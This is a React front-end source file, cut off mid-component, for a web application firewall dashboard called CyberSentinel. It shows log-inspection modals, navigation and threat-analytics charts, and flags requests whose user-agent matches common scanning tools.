import React, { useState, useEffect, useRef } from 'react';
import { createPortal } from 'react-dom';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ShieldAlert, LayoutDashboard, Activity, BarChart2,
  Settings as SettingsIcon, Server, Search, Filter, ShieldCheck,
  AlertTriangle, Globe, Lock
} from 'lucide-react';
import { AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip as RechartsTooltip, ResponsiveContainer, PieChart, Pie, Cell, Sector, ComposedChart, Bar, RadialBarChart, RadialBar } from 'recharts';
import {
  getStats, getTimeline, getAttackTypes, getTopIPs, getTopRules, getSeverityDistribution, getHealth,
  getRules, enableRule, disableRule, setParanoiaLevel, getRulesStats, getRulesHistory, resetRules, getRuleDetails,
  getLogs, getLogById,
  getGeneralSettings, saveGeneralSettings, getLogSettings, saveLogSettings,
  getWafSettings, saveWafSettings, getCustomResponse, saveCustomResponse, getPositiveSecurity, savePositiveSecurity,
  getAutoLearning, saveAutoLearning, getDdosBotSettings, getDdosAnalytics, saveDdosBotSettings,
  changeAdminPassword, restartWafEngine, reloadNginxProxy, purgeStatsCache, syncSignatures,
  markFalsePositive, getFalsePositives, updateFalsePositiveStatus, updateFalsePositiveNote, deleteFalsePositive,
  getExclusions, createExclusion, updateExclusionStatus, updateExclusionNote, deleteExclusion, getExclusionsAnalytics, getExclusionsHistory, previewExclusionRule,
  getCurrentUser, logoutUser,
  getDiscoveredEndpoints, getRecentlyDiscoveredEndpoints, getApiProtectionAnalytics, getHardeningSettings, saveHardeningSettings, getAntiDefacementSettings, saveAntiDefacementSettings, getMLStats, getMLLogs, getMLTimeline,
  getMLModelInfo, triggerMLRetrain, getMLRetrainStatus, getMLBackups, rollbackMLModel, getMLFeatureImportance,
  getAlertChannels, createAlertChannel, updateAlertChannel, deleteAlertChannel, testAlertChannel, getAlertRules, createAlertRule, updateAlertRule, deleteAlertRule, getAlertHistory, acknowledgeAlert, getAlertStats,
  getCustomRules, saveCustomRules
} from './services/api';
import { Copy, Check, ChevronLeft, ChevronRight, X, Clock, Database, Code, ShieldAlert as AlertIcon, AlertTriangle as AlertTriangleIcon, LogOut, Brain, Bell, FileText, RefreshCw } from 'lucide-react';
import Login from './components/Login';
import DdosBotMitigation from './components/DdosBotMitigation';
import ProtectedApps from './components/ProtectedApps';
import SetupWizard from './components/SetupWizard';
import ProtectedAppWizard from './components/ProtectedAppWizard';

import SecurityReports from './components/SecurityReports';
import QuickActionsBar from './components/QuickActionsBar';
import Tooltip, { HelpText } from './components/Tooltip';
import { NoTrafficEmptyState, NoLogsEmptyState, NoSearchResultsEmptyState, NoFalsePositivesEmptyState, NoExceptionsEmptyState, NoMLEventsEmptyState } from './components/EmptyStates';

import './index.css';

function parseJwt(token) {
  try {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function (c) {
      return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
    return JSON.parse(jsonPayload);
  } catch {
    return null;
  }
}

const formatLocalTime = (utcString) => {
  if (!utcString) return '-';
  try {
    let cleanStr = String(utcString).trim();
    cleanStr = cleanStr.replace('T', ' ').replace('Z', '');
    
    // Parse as UTC and convert to local timezone
    const date = new Date(cleanStr + 'Z'); // Add Z to indicate UTC
    if (isNaN(date.getTime())) {
      // Fallback: if parsing fails, just remove Z and return
      return cleanStr;
    }
    
    // Convert to local time string
    return date.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(/,/g, '').replace(/\//g, '-');
  } catch (e) {
    // Final fallback - just clean up the string
    let cleanStr = String(utcString).trim();
    cleanStr = cleanStr.replace('T', ' ').replace('Z', '');
    return cleanStr.split('.')[0];
  }
};

function HighlightedJson({ json }) {
  if (!json) return null;

  const jsonStr = JSON.stringify(json, null, 2);
  const lines = jsonStr.split('\n');

  const tokenizeLine = (line) => {
    const tokenRegex = /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?|[{}[\]:,]|\s+)/g;
    const matches = line.match(tokenRegex) || [line];

    return matches.map((token, index) => {
      let className = 'json-punctuation';
      if (/^"/.test(token)) {
        if (/:$/.test(token)) {
          className = 'json-key';
        } else {
          className = 'json-string';
        }
      } else if (/^(true|false)$/.test(token)) {
        className = 'json-boolean';
      } else if (/^null$/.test(token)) {
        className = 'json-null';
      } else if (/^-?\d+/.test(token)) {
        className = 'json-number';
      }

      return (
        <span key={index} className={className}>
          {token}
        </span>
      );
    });
  };

  return (
    <pre className="json-pre">
      <code>
        {lines.map((line, lineIndex) => (
          <div key={lineIndex} className="json-line">
            <span className="line-number">{lineIndex + 1}</span>
            <span className="line-content">{tokenizeLine(line)}</span>
          </div>
        ))}
      </code>
    </pre>
  );
}

function LogDetailsModal({ isOpen, log, onClose, onMarkFalsePositive }) {
  const [copied, setCopied] = useState(false);
  const [showReqHeaders, setShowReqHeaders] = useState(false);
  const [showResHeaders, setShowResHeaders] = useState(false);
  const [showViolations, setShowViolations] = useState(true);
  const [showRawJson, setShowRawJson] = useState(false);

  useEffect(() => {
    if (copied) {
      const t = setTimeout(() => setCopied(false), 2000);
      return () => clearTimeout(t);
    }
  }, [copied]);

  useEffect(() => {
    if (isOpen) {
      const timer = setTimeout(() => {
        setShowReqHeaders(false);
        setShowResHeaders(false);
        setShowViolations(true);
        setShowRawJson(false);
      }, 0);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  if (!isOpen || !log) return null;

  // ── Derived fields ───────────────────────────────────────────────────────
  const reqHeaders = log.request_headers || {};
  const userAgent = reqHeaders['User-Agent'] || reqHeaders['user-agent'] || '';
  const referer = reqHeaders['Referer'] || reqHeaders['referer'] || '';
  const violations = log.violations || [];
  const matchedPayloads = violations.map(v => v.data).filter(d => d && d.trim().length > 0);

  // Determine target application from hostname + uri
  const hostname = log.hostname || '';
  let targetApp = 'Unknown Application';
  if (log.uri && (log.uri.startsWith('/api/auth') || log.uri.startsWith('/api/logs') || log.uri.startsWith('/api/settings'))) {
    targetApp = 'CyberSentinel WAF Dashboard';
  } else if (hostname) {
    targetApp = 'MSSP Application';
  }
  if (hostname) targetApp += ' · ' + hostname;

  // Collect OWASP tags from raw_log
  const owaspTags = [];
  try {
    const msgs = log.raw_log?.transaction?.messages || [];
    msgs.forEach(m => {
      (m.details?.tags || []).forEach(tag => {
        if (!owaspTags.includes(tag) && tag !== 'OWASP_CRS') owaspTags.push(tag);
      });
    });
  } catch (_) { }

  const sectionStyle = { marginBottom: '14px' };
  const collapsibleHeader = (label, count, open, toggle) => (
    <div
      onClick={toggle}
      style={{
        display: 'flex', justifyContent: 'space-between', alignItems: 'center',
        padding: '10px 14px', background: 'rgba(255,255,255,0.03)',
        border: '1px solid rgba(255,255,255,0.07)',
        borderRadius: open ? '6px 6px 0 0' : '6px',
        cursor: 'pointer', userSelect: 'none',
      }}
    >
      <span style={{ fontSize: '13px', fontWeight: 600, color: '#e4e4e7' }}>{label}{count !== undefined ? ` (${count})` : ''}</span>
      <span style={{ color: '#a1a1aa', fontSize: '12px' }}>{open ? '▼' : '►'}</span>
    </div>
  );

  const handleCopy = () => {
    const raw = log.raw_log || log;
    const textToCopy = JSON.stringify(raw, null, 2);

    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(textToCopy)
        .then(() => setCopied(true))
        .catch(err => console.error("Copy failed", err));
    } else {
      try {
        const textArea = document.createElement("textarea");
        textArea.value = textToCopy;
        textArea.style.position = "fixed";
        textArea.style.left = "-999999px";
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);
        if (successful) setCopied(true);
      } catch (err) {
        console.error("Fallback copy error", err);
      }
    }
  };

  return createPortal(
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '680px' }}>
        <div className="modal-header">
          <div className="modal-title">
            <AlertIcon size={20} color="#ef4444" />
            <span>Inspection: Log Transaction ID: <span style={{ fontFamily: 'monospace', color: '#3b82f6' }}>{log.id}</span></span>
          </div>
          <button className="modal-close-btn" onClick={onClose}>
            <X size={18} />
          </button>
        </div>
        <div className="modal-body" style={{ maxHeight: '80vh', overflowY: 'auto' }}>

          {/* Metadata Grid */}
          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px', marginBottom: '20px', background: 'rgba(255,255,255,0.02)', padding: '16px', borderRadius: '8px', border: '1px solid rgba(255,255,255,0.05)' }}>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Timestamp</div>
              <div style={{ fontSize: '14px', fontWeight: 500, marginTop: '4px' }}>{formatLocalTime(log.timestamp)}</div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Attacker IP</div>
              <div style={{ fontSize: '14px', fontWeight: 500, fontFamily: 'monospace', color: '#3b82f6', marginTop: '4px' }}>{log.client_ip}</div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Attack Vector</div>
              <div style={{ fontSize: '14px', marginTop: '4px' }}>
                <span className={`severity-badge severity-${(log.severity || 'low').toLowerCase()}`} style={{ marginRight: '8px' }}>
                  {log.severity}
                </span>
                {log.attack_type}
              </div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Country</div>
              <div style={{ fontSize: '14px', fontWeight: 500, marginTop: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                <Globe size={14} color="#3b82f6" />
                <span>{log.country || 'Unknown'}</span>
              </div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Source ASN / Org</div>
              <div style={{ fontSize: '14px', fontWeight: 500, fontFamily: 'monospace', color: '#93c5fd', marginTop: '4px', textOverflow: 'ellipsis', overflow: 'hidden', whiteSpace: 'nowrap' }} title={log.source_asn_org}>
                {log.source_asn_org || 'Unknown'}
              </div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>HTTP Response</div>
              <div style={{ fontSize: '14px', fontFamily: 'monospace', fontWeight: 700, color: '#ef4444', marginTop: '4px' }}>{log.http_code || '403'}</div>
            </div>
            <div>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Target Application</div>
              <div style={{ fontSize: '13px', color: '#34d399', fontWeight: 500, marginTop: '4px' }}>{targetApp}</div>
            </div>
            <div style={{ gridColumn: 'span 2' }}>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase' }}>Requested URI</div>
              <div style={{ fontSize: '13px', fontFamily: 'monospace', color: '#ef4444', wordBreak: 'break-all', marginTop: '4px' }}>
                <span style={{ color: '#a1a1aa', fontWeight: 600, marginRight: '6px' }}>{log.method}</span>
                {log.uri}
              </div>
            </div>
          </div>

          {/* ── User-Agent ── */}
          {userAgent && (
            <div style={{ ...sectionStyle, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '8px', padding: '12px 14px' }}>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase', marginBottom: '6px' }}>🌐 User-Agent (Client Tool / Browser)</div>
              <div style={{ fontSize: '12px', fontFamily: 'monospace', color: '#93c5fd', wordBreak: 'break-all' }}>{userAgent}</div>
              {(userAgent.toLowerCase().includes('sqlmap') || userAgent.toLowerCase().includes('nikto') || userAgent.toLowerCase().includes('nmap') || userAgent.toLowerCase().includes('dirbuster') || userAgent.toLowerCase().includes('burp')) && (
                <span style={{ display: 'inline-flex', alignItems: 'center', gap: '4px', marginTop: '6px', background: 'rgba(251,146,60,0.12)', border: '1px solid rgba(251,146,60,0.3)', borderRadius: '4px', padding: '2px 8px', fontSize: '11px', color: '#fb923c', fontWeight: 600 }}>⚠ Known Attack Tool Detected</span>
              )}
            </div>
          )}

          {/* ── Referer ── */}
          {referer && (
            <div style={{ ...sectionStyle, background: 'rgba(255,255,255,0.02)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '8px', padding: '12px 14px' }}>
              <div style={{ fontSize: '11px', color: '#a1a1aa', textTransform: 'uppercase', marginBottom: '6px' }}>🔗 Referer (Attack Origin Page)</div>
              <div style={{ fontSize: '12px', fontFamily: 'monospace', color: '#86efac', wordBreak: 'break-all' }}>{referer}</div>
            </div>
          )}

          {/* ── Request Headers ── */}
          <div style={sectionStyle}>
            {collapsibleHeader('Request Headers', Object.keys(reqHeaders).length, showReqHeaders, () => setShowReqHeaders(!showReqHeaders))}
            {showReqHeaders && (
              <div style={{ background: 'rgba(0,0,0,0.2)', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderTop: 'none', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', maxHeight: '200px', overflowY: 'auto' }}>
                {Object.keys(reqHeaders).length === 0 ? (
                  <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '10px' }}>No request headers recorded.</div>
                ) : (
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}><tbody>
                    {Object.entries(reqHeaders)
                      .map(([k, v]) => (
                        <tr key={k} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                          <td style={{ color: '#a1a1aa', padding: '5px 0', fontWeight: 600, width: '30%', verticalAlign: 'top', wordBreak: 'break-all' }}>{k}</td>
                          <td style={{ color: '#e4e4e7', padding: '5px 8px', fontFamily: 'monospace', wordBreak: 'break-all', verticalAlign: 'top' }}>{v}</td>
                        </tr>
                      ))}
                  </tbody></table>
                )}
              </div>
            )}
          </div>

          {/* ── Response Headers ── */}
          <div style={sectionStyle}>
            {collapsibleHeader('Response Headers', Object.keys(log.response_headers || {}).length, showResHeaders, () => setShowResHeaders(!showResHeaders))}
            {showResHeaders && (
              <div style={{ background: 'rgba(0,0,0,0.2)', padding: '12px', border: '1px solid rgba(255,255,255,0.05)', borderTop: 'none', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', maxHeight: '200px', overflowY: 'auto' }}>
                {Object.keys(log.response_headers || {}).length === 0 ? (
                  <div style={{ color: '#a1a1aa', fontSize: '12px', textAlign: 'center', padding: '10px' }}>
                    No response headers recorded.
                    {log.http_code && (log.http_code.startsWith('4') || log.http_code.startsWith('5')) && (
                      <div style={{ marginTop: '6px', fontSize: '11px', color: '#71717a' }}>ℹ️ Blocked requests (HTTP {log.http_code}) may not log backend response headers.</div>
                    )}
                  </div>
                ) : (
                  <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '12px' }}><tbody>
                    {Object.entries(log.response_headers || {}).map(([k, v]) => (
                      <tr key={k} style={{ borderBottom: '1px solid rgba(255,255,255,0.03)' }}>
                        <td style={{ color: '#a1a1aa', padding: '5px 0', fontWeight: 600, width: '30%', verticalAlign: 'top', wordBreak: 'break-all' }}>{k}</td>
                        <td style={{ color: '#e4e4e7', padding: '5px 8px', fontFamily: 'monospace', wordBreak: 'break-all', verticalAlign: 'top' }}>{v}</td>
                      </tr>
                    ))}
                  </tbody></table>
                )}
              </div>
            )}
          </div>


          {/* ── Raw JSON (collapsed by default) ── */}
          <div style={{ marginBottom: '8px' }}>
            <div
              onClick={() => setShowRawJson(!showRawJson)}
              style={{
                display: 'flex', justifyContent: 'space-between', alignItems: 'center',
                padding: '10px 14px',
                background: 'rgba(255,255,255,0.02)',
                border: '1px solid rgba(255,255,255,0.06)',
                borderRadius: showRawJson ? '6px 6px 0 0' : '6px',
                cursor: 'pointer', userSelect: 'none',
              }}
            >
              <span style={{ fontSize: '12px', fontWeight: 600, color: '#a1a1aa', textTransform: 'uppercase', letterSpacing: '0.04em' }}>Raw Audit Log (JSON)</span>
              <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
                {onMarkFalsePositive && (
                  <button
                    className="pagination-btn"
                    onClick={(e) => { e.stopPropagation(); onMarkFalsePositive(log); }}
                    style={{ padding: '3px 8px', fontSize: '11px', borderColor: 'rgba(16, 185, 129, 0.4)', background: 'rgba(16, 185, 129, 0.05)', color: '#a7f3d0' }}
                  >
                    <ShieldCheck size={13} color="#10b981" />
                    <span>Mark as FP</span>
                  </button>
                )}
                <button
                  className="pagination-btn"
                  onClick={(e) => { e.stopPropagation(); handleCopy(); }}
                  style={{ padding: '3px 8px', fontSize: '11px' }}
                >
                  {copied ? <Check size={13} color="#10b981" /> : <Copy size={13} />}
                  <span>{copied ? 'Copied!' : 'Copy JSON'}</span>
                </button>
                <span style={{ color: '#52525b', fontSize: '12px' }}>{showRawJson ? '▼' : '►'}</span>
              </div>
            </div>
            {showRawJson && (
              <div style={{ border: '1px solid rgba(255,255,255,0.06)', borderTop: 'none', borderBottomLeftRadius: '6px', borderBottomRightRadius: '6px', overflow: 'hidden' }}>
                <HighlightedJson json={log.raw_log || log} />
              </div>
            )}
          </div>
        </div>
        <div className="modal-footer">
          <button className="modal-btn secondary" onClick={onClose}>Close</button>
        </div>
      </div>
    </div>,
    document.body
  );
}

function Sidebar({ activeTab, setActiveTab, handleLogout, userRole, collapsed, setCollapsed }) {
  // Streamlined 5-tab navigation
  const navItems = [
    { id: 'overview', label: 'Overview', icon: LayoutDashboard },
    { id: 'protection', label: 'Protection Status', icon: ShieldCheck },
    { id: 'events', label: 'Security Events', icon: Activity },
    { id: 'ml_engine', label: 'AI/ML Engine', icon: Brain },
    { id: 'advanced', label: 'Advanced', icon: SettingsIcon }
  ];

  const ToggleIcon = collapsed ? ChevronRight : ChevronLeft;

  return (
    <div className={`sidebar ${collapsed ? 'collapsed' : ''}`}>
      <div className="sidebar-brand">
        <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
          <img
            src="/WAFlogo.ico"
            alt="WAF Logo"
            style={{
              height: collapsed ? '28px' : '46px',
              width: collapsed ? '28px' : '46px',
              objectFit: 'contain',
              filter: 'drop-shadow(0 0 8px rgba(0, 212, 255, 0.4))'
            }}
            className="brand-icon"
          />
          {!collapsed && (
            <div style={{ display: 'flex', flexDirection: 'column', justifyContent: 'center' }}>
              <span className="brand-text">
                CyberSentinel
              </span>
              <span className="sidebar-brand-subtitle">
                WAF ENGINE
              </span>
            </div>
          )}
        </div>
        <div
          onClick={() => setCollapsed(!collapsed)}
          className="sidebar-toggle"
          title={collapsed ? "Expand Sidebar" : "Collapse Sidebar"}
        >
          <ToggleIcon size={14} />
        </div>
      </div>

      <div className="nav-menu nav-menu-scroll">
        {navItems.map((item) => {
          const Icon = item.icon;
          return (
            <div
              key={item.id}
              className={`nav-item ${activeTab === item.id ? 'active' : ''}`}
              onClick={() => setActiveTab(item.id)}
            >
              <Icon size={20} />
              <span>{item.label}</span>
            </div>
          );
        })}
      </div>

      {/* System Status Mini-panel */}
      {!collapsed && (
        <div className="sidebar-status-panel animate-fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
          <div className="sidebar-status-item">
            <div className="pulse-dot"></div>
            <span>WAF: ACTIVE</span>
          </div>
          <div className="sidebar-status-item">
            <div className="pulse-dot"></div>
            <span>AI: ONLINE</span>
          </div>
          <div className="sidebar-status-item">
            <div className="pulse-dot"></div>
            <span>REDIS: CONNECTED</span>
          </div>
        </div>
      )}

      <div className="sidebar-footer">
        <div className="nav-item" onClick={handleLogout}>
          <LogOut size={20} />
          <span>Logout</span>
        </div>
      </div>
    </div>
  );
}

function AnimatedNumber({ value = 0 }) {
  const safeValue = value || 0;
  const [displayValue, setDisplayValue] = React.useState(safeValue);

  React.useEffect(() => {
    let start = displayValue;
    const end = safeValue;
    if (start === end) return;

    const duration = 800; // ms
    const startTime = performance.now();

    let animationFrame;
    const updateNumber = (now) => {
      const elapsed = now - startTime;
      const progress = Math.min(elapsed / duration, 1);

      // easeOutQuad
      const easeProgress = progress * (2 - progress);
      const current = Math.floor(start + (end - start) * easeProgress);

      setDisplayValue(current);

      if (progress < 1) {
        animationFrame = requestAnimationFrame(updateNumber);
      } else {
        setDisplayValue(end);
      }
    };

    animationFrame = requestAnimationFrame(updateNumber);
    return () => cancelAnimationFrame(animationFrame);
  }, [safeValue]);

  return <span>{(displayValue || 0).toLocaleString()}</span>;
}

function ThreatAnalytics() {
  const [stats, setStats] = useState({
    total_requests: 0,
    total_blocked: 0,
    sqli_count: 0,
    xss_count: 0,
    top_attack_type: '-',
    total_unique_ips: 0
  });
  const [attackDistribution, setAttackDistribution] = useState([]);
  const [severityDistribution, setSeverityDistributionData] = useState([]);
  const [timelineData, setTimelineData] = useState([]);
  const [topRules, setTopRules] = useState([]);
  const [topIPs, setTopIPs] = useState([]);
  const [loading, setLoading] = useState(true);
  const [refreshInterval, setRefreshInterval] = useState(3000);
  const [liveUpdates, setLiveUpdates] = useState(true);

  const [showFlash, setShowFlash] = useState(false);
  const [activeVectorIndex, setActiveVectorIndex] = useState(null);
  const prevBlockedRef = React.useRef(0);

  useEffect(() => {
    getGeneralSettings().then(settings => {
      if (settings.refreshInterval) {
        if (settings.refreshInterval === 'off') setRefreshInterval(0);
        else setRefreshInterval(parseInt(settings.refreshInterval) * 1000 || 5000);
      }
      if (settings.liveUpdates !== undefined) setLiveUpdates(settings.liveUpdates);
    }).catch(err => console.error("Failed to load general settings", err));
  }, []);

  const fetchAnalytics = async () => {
    try {
      const [statsRes, distRes, sevRes, timeRes, rulesRes, ipsRes] = await Promise.allSettled([
        getStats(),
        getAttackTypes(),
        getSeverityDistribution(),
        getTimeline(),
        getTopRules(),
        getTopIPs()
      ]);

      if (statsRes.status === 'fulfilled') {
        if (prevBlockedRef.current && statsRes.value.total_blocked > prevBlockedRef.current) {
          setShowFlash(true);
          setTimeout(() => setShowFlash(false), 800);
        }
        prevBlockedRef.current = statsRes.value.total_blocked;
        setStats(statsRes.value);
      }

      if (distRes.status === 'fulfilled') {
        const mappedDist = distRes.value
          .filter(d => d.attack_type && d.attack_type !== 'Unknown')
          .map(d => ({ name: d.attack_type, value: d.count }));
        setAttackDistribution(mappedDist);
      }

      if (sevRes.status === 'fulfilled') {
        const mappedSev = sevRes.value.map(s => ({ name: s.severity, value: s.count }));
        setSeverityDistributionData(mappedSev);
      }

      if (timeRes.status === 'fulfilled') {
        const mappedTime = timeRes.value.data.map(t => {
          let displayTime = t.time;
          if (displayTime.includes('T')) {
            displayTime = displayTime.split('T')[1];
          } else if (displayTime.includes(' ')) {
            const parts = displayTime.split(' ');
            displayTime = parts[parts.length - 1];
          }
          return { time: displayTime, attacks: t.count };
        });
        setTimelineData(mappedTime);
      }

      if (rulesRes.status === 'fulfilled') {
        setTopRules(rulesRes.value.slice(0, 5));
      }

      if (ipsRes.status === 'fulfilled') {
        setTopIPs(ipsRes.value.slice(0, 5));
      } else {
        console.warn('Top IPs unavailable (Redis may be unreachable):', ipsRes.reason);
      }

    } catch (err) {
      console.error("Failed to fetch analytics data", err);
    } finally {
      setLoading(false);
    }
  };

  const handleExportCSV = () => {
    fetch(`${window.location.protocol}//${window.location.host}/api/stats/export/csv`, {
      credentials: 'include'
    })
      .then(response => {
        if (!response.ok) throw new Error("Export failed");
        return response.blob();
      })
      .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `waf_security_report_${new Date().toISOString().split('T')[0]}.csv`;
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.URL.revokeObjectURL(url);
      })
      .catch(err => {
        console.error("Export error:", err);
        alert("Failed to export security logs: " + err.message);
      });
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      fetchAnalytics();
    }, 0);
    if (refreshInterval > 0 && liveUpdates) {
      const interval = setInterval(fetchAnalytics, refreshInterval);
      return () => {
        clearTimeout(timer);
        clearInterval(interval);
      };
    }
    return () => clearTimeout(timer);
  }, [refreshInterval, liveUpdates]);

  const COLORS = {
    'SQL Injection': '#fb923c',
    'XSS': '#ec4899',
    'RCE': '#ef4444',
    'Protocol Violation': '#3b82f6',
    'LFI/RFI': '#a855f7',
    'PHP Injection': '#f43f5e',
    'Scanner/Recon': '#eab308',
    'Anomaly Threshold Exceeded': '#6b7280',
    'Critical': '#ef4444',
    'High': '#f97316',
    'Medium': '#eab308',
    'Low': '#3b82f6'
  };

  const severityColors = ['#ef4444', '#f97316', '#eab308', '#3b82f6'];

  if (loading && timelineData.length === 0) {
    return (
      <div className="dashboard-grid animate-pulse" style={{ opacity: 0.7 }}>
        {Array.from({ length: 5 }).map((_, i) => (
          <div key={i} className="metric-card glass-panel" style={{ gridColumn: i === 1 || i === 4 ? 'span 3' : 'span 2', minHeight: '120px' }}>
            <div style={{ width: '40%', height: '12px', background: 'rgba(255,255,255,0.05)', borderRadius: '4px' }} />
            <div style={{ width: '60%', height: '28px', background: 'rgba(255,255,255,0.08)', borderRadius: '6px', marginTop: '16px' }} />
            <div style={{ width: '30%', height: '10px', background: 'rgba(255,255,255,0.04)', borderRadius: '3px', marginTop: '12px' }} />
          </div>
        ))}
        <div className="chart-card glass-panel" style={{ gridColumn: 'span 8', minHeight: '350px' }}>
          <div style={{ width: '30%', height: '16px', background: 'rgba(255,255,255,0.05)', borderRadius: '4px', marginBottom: '24px' }} />
          <div style={{ width: '100%', height: '240px', background: 'rgba(255,255,255,0.02)', borderRadius: '8px' }} />
        </div>
        <div className="chart-card glass-panel" style={{ gridColumn: 'span 4', minHeight: '350px' }}>
          <div style={{ width: '40%', height: '16px', background: 'rgba(255,255,255,0.05)', borderRadius: '4px', marginBottom: '24px' }} />
          <div style={{ width: '120px', height: '120px', borderRadius: '50%', border: '8px solid rgba(255,255,255,0.03)', margin: '40px auto' }} />
        </div>
      </div>
    );
  }

  // Show empty state if no traffic has been analyzed yet
  if (!loading && stats.total_requests === 0 && timelineData.length === 0) {
    return <NoTrafficEmptyState />;
  }

  const blockedPercentage = stats.total_requests > 0 ? (stats.total_blocked / stats.total_requests) * 100 : 0;
  const radius = 22;
  const circumference = 2 * Math.PI * radius;
  const strokeDashoffset = circumference - (blockedPercentage / 100) * circumference;

  const totalSeverityCount = severityDistribution.reduce((acc, curr) => acc + curr.value, 0);

  const radialData = severityDistribution
    .filter(s => s.value > 0)
    .map((s) => ({
      name: s.name,
      value: s.value,
      fill: COLORS[s.name] || '#3b82f6'
    }));

  const CustomTimelineTooltip = ({ active, payload, label }) => {
    if (active && payload && payload.length) {
      return (
        <div style={{
          background: 'rgba(6, 13, 23, 0.95)',
          border: '1px solid rgba(0, 212, 255, 0.2)',
          borderRadius: '8px',
          padding: '10px 14px',
          boxShadow: '0 8px 30px rgba(0,0,0,0.6)',
          backdropFilter: 'blur(8px)'
        }}>
          <div style={{ fontSize: '10px', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)', marginBottom: '4px' }}>
            TIME: {label}
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
            <div style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: 'var(--danger-color)' }} />
            <span style={{ fontSize: '12px', fontWeight: 600, color: 'var(--text-primary)' }}>
              Attacks: {payload[0].value}
            </span>
          </div>
        </div>
      );
    }
    return null;
  };

  return (
    <motion.div
      className="dashboard-grid animate-fade-in"
      initial={{ opacity: 0, y: 10 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.4 }}
    >
      {/* Metric Cards */}
      <div className="metric-card glass-panel" style={{ gridColumn: 'span 2' }}>
        <div className="metric-header">
          <span>Total Requests Analyzed</span>
          <div className="metric-icon-wrapper blue"><Activity size={18} /></div>
        </div>
        <div className="metric-value"><AnimatedNumber value={stats.total_requests} /></div>
        <div className="metric-trend trend-down">
          <span className="trend-arrow">↓</span> <Clock size={12} /> <span>Real-time capture</span>
        </div>
      </div>

      <div className="metric-card glass-panel danger" style={{ gridColumn: 'span 3', animation: stats.recent_threats > 0 ? 'dangerPulse 2s infinite' : 'none' }}>
        <div className="metric-header">
          <span>Blocked WAF Threats <span style={{ fontSize: '10px', opacity: 0.8, marginLeft: '4px', fontWeight: 'bold', color: 'var(--danger-color)' }}>(Cumulative)</span></span>
          <div className="metric-icon-wrapper red"><AlertIcon size={18} /></div>
        </div>
        <div className="metric-value" style={{ color: 'var(--danger-color)' }}><AnimatedNumber value={stats.total_blocked} /></div>
        <div className="metric-trend trend-up">
          <span className="trend-arrow">↑</span> <span>Real-time threat monitoring active</span>
        </div>
      </div>

      <div className="metric-card glass-panel warning" style={{ gridColumn: 'span 2' }}>
        <div className="metric-header">
          <span>SQL Injection Count</span>
          <div className="metric-icon-wrapper orange"><Database size={18} /></div>
        </div>
        <div className="metric-value" style={{ color: 'var(--warning-color)' }}><AnimatedNumber value={stats.sqli_count} /></div>
        <div className="metric-trend trend-down">
          <span className="trend-arrow">↓</span> <span>Inbound vectors</span>
        </div>
      </div>

      <div className="metric-card glass-panel" style={{ gridColumn: 'span 2' }}>
        <div className="metric-header">
          <span>Cross-Site Scripting (XSS)</span>
          <div className="metric-icon-wrapper orange" style={{ color: '#ec4899', background: 'rgba(236,72,153,0.1)', boxShadow: '0 0 12px rgba(236, 72, 153, 0.15)' }}><Code size={18} /></div>
        </div>
        <div className="metric-value" style={{ color: '#ec4899' }}><AnimatedNumber value={stats.xss_count} /></div>
        <div className="metric-trend trend-down">
          <span className="trend-arrow">↓</span> <span>Application shields</span>
        </div>
      </div>

      <div className="metric-card glass-panel" style={{ gridColumn: 'span 3' }}>
        <div className="metric-header">
          <span>Unique Attacking IPs</span>
